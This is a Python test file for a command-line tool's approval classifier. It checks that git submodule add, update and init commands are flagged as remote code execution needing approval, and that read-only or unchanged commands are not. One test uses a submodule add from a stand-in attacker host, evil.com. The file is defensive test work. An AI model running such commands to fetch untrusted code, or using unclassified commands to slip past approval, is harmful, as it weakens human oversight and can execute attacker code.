"""Tests for approval git submodule supply-chain bypass."""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from spark_cli.security.approval import approval_required_for_command


class TestGitSubmoduleBypass:
    """Verify that git submodule add/update/init is classified as remote_code_execution."""

    def test_git_submodule_add(self) -> None:
        decision = approval_required_for_command(
            ["git", "submodule", "add", "https://evil.com/repo.git"]
        )
        assert decision.requires_approval is True
        assert decision.action_class == "remote_code_execution"
        assert decision.risk == "critical"

    def test_git_submodule_update_init(self) -> None:
        decision = approval_required_for_command(
            ["git", "submodule", "update", "--init"]
        )
        assert decision.requires_approval is True
        assert decision.action_class == "remote_code_execution"

    def test_git_submodule_update_init_recursive(self) -> None:
        decision = approval_required_for_command(
            ["git", "submodule", "update", "--init", "--recursive"]
        )
        assert decision.requires_approval is True
        assert decision.action_class == "remote_code_execution"

    def test_git_submodule_status_is_none(self) -> None:
        """git submodule status is read-only."""
        decision = approval_required_for_command(
            ["git", "submodule", "status"]
        )
        assert decision.requires_approval is False
        assert decision.action_class == "none"

    def test_git_clone_still_none(self) -> None:
        """git clone (without submodule) is still unclassified (not changed by this fix)."""
        decision = approval_required_for_command(
            ["git", "clone", "https://github.com/user/repo.git"]
        )
        assert decision.requires_approval is False
        assert decision.action_class == "none"
